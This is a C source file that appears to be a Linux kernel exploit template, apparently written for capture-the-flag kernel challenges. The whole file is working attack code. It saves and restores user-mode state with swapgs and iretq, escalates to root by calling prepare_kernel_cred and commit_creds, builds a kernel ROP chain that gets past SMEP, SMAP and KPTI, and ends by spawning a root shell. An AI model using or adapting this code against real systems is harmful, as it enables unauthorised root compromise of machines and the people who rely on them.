#include <unistd.h>

#include "vars.h"

void win(void) {
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

void save_state(void) {
    asm("movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");
}

// nosmep
void restore_state(void) {
    asm volatile(
        "swapgs ;"
        "movq %0, 0x20(%%rsp)\t\n"
        "movq %1, 0x18(%%rsp)\t\n"
        "movq %2, 0x10(%%rsp)\t\n"
        "movq %3, 0x08(%%rsp)\t\n"
        "movq %4, 0x00(%%rsp)\t\n"
        "iretq"
        :
        : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs), "r"(win));
}

// nosmep
void escalate_privilege(void) {
    char *(*pkc)(int) = (void *)(addr_prepare_kernel_cred);
    void (*cc)(char *) = (void *)(addr_commit_creds);
    if (addr_init_cred == DUMMY_VALUE) {
        (*cc)((*pkc)(0));
    } else {
        (*cc)((char *)addr_init_cred);
    }
    restore_state();
}

// +smep,+smap
static void krop(uint64_t *ptr) {
    *ptr++ = pop_rdi_ret;
    *ptr++ = 0;
    *ptr++ = addr_prepare_kernel_cred;
    *ptr++ = pop_rcx_ret;
    *ptr++ = 0;
    *ptr++ = mov_rdi_rax_rep_ret;
    *ptr++ = addr_commit_creds;
    *ptr++ = bypass_kpti;
    *ptr++ = 0xdeadbeef;
    *ptr++ = 0xcafebabe;
    *ptr++ = (uint64_t)&win;
    *ptr++ = user_cs;
    *ptr++ = user_rflags;
    *ptr++ = user_rsp;
    *ptr++ = user_ss;
}
